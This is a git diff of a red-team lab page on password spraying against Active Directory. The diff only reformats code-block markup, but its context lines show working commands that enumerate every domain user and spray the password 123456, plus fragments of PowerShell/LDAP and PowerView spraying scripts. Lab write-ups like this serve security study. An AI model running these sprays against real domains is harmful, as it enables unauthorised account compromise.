@@ -4,24 +4,20 @@ This lab explores ways of password spraying against Active Directory accounts.
 
 ## Invoke-DomainSpray
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
 type users.txt
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-21-29-13.png)
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-21-32-37.png)
 
@@ -33,8 +29,7 @@ While I was poking around with dsacls for enumerating AD object permissions
 
 I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 $domain = ((cmd /c set u)[-3] -split "=")[-1]
 $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
@@ -54,8 +49,7 @@ $password = "123456"
     }
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-20-00-10-10.png)
 
@@ -63,8 +57,7 @@ $password = "123456"
 
 Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:
 
-{% tabs %}
-{% tab title="spray-ldap.ps1" %}
+{% code title="spray-ldap.ps1" %}
 ```csharp
 # will spray only users that currently have 0 bad password attempts
 # dependency - powerview
@@ -94,8 +87,7 @@ Write-Host $users.Count users supplied; $users | % {
     }
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Enjoy the shells:
 
